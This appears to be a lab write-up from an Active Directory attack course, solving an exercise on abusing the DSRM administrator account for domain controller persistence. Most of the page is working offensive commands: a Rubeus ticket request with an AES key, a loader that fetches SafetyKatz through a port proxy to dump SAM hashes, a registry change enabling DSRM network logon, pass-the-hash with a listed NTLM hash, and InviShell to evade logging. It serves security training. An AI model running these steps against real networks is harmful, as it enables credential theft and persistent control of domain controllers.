---
icon: vial
---

# 11 - Learning Object1️1️

## Tasks



1 - Use Domain Admin privileges obtained earlier to abuse the DSRM credential for persistence

Flag 20 \[dcorp-dc] - Name of the Registry key modified to change Logon behavior of DSRM administrator 🚩

## Solutions

### 1 - Use Domain Admin privileges obtained earlier to abuse the DSRM credential for persistence

To obtain a persistance with administrative access to the DC we need to have Domain Admin privileges by abusing the DSRM administrator:

```powershell
 C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

As usual, into the new shell spawned we need to run the following commands for copying Loader.exe to the DC and extract credentials from the SAM hive:

```powershell
echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe /Y
winrs -r:dcorp-dc cmd
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.67
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "token::elevate" "lsadump::evasive-sam" "exit"
```

<figure><img src="../../.gitbook/assets/image (202).png" alt=""><figcaption></figcaption></figure>

The DSRM administrator is not allowed to logon to the DC from network, so we need to change the logon behavior for the account by modifying registry on the DC. We can do this as follows:

```powershell
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v "DsrmAdminLogonBehavior" /t REG_DWORD /d 2 /f
```

Now on the student VM, we can use Pass-The-Hash (not OverPass-The-Hash) for the DSRM administrator:

```powershell
 C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe "sekurlsa::evasive-pth /domain:dcorp-dc /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:cmd.exe" "exit"
```

From the new procees, we can now access dcorp-dc. In this case we are using PowerShell Remoting with IP address and Authentication: 'NegotiateWithImplicitCredential' as we are using NTLM authentication. So, it's necessary to modify TrustedHosts for the student VM running the below command from an elevated PowerShell session:

```powershell
Set-Item WSMan:\localhost\Client\TrustedHosts 172.16.2.1
```

Now, run the commands below to access the DC:

```powershell
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
```

```powershell
Enter-PSSession -ComputerName 172.16.2.1 -Authentication NegotiateWithImplicitCredential
```

```powershell
$env:username
```

<figure><img src="../../.gitbook/assets/image (204).png" alt=""><figcaption></figcaption></figure>

### Flag 20 \[dcorp-dc] - Name of the Registry key modified to change Logon behavior of DSRM administrator 🚩

```powershell
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v "DsrmAdminLogonBehavior" /t REG_DWORD /d 2 /f
```

Based on the last command, the registry key modified to change Logon behavior of DSRM administrator is: DsrmAdminLogonBehavior.
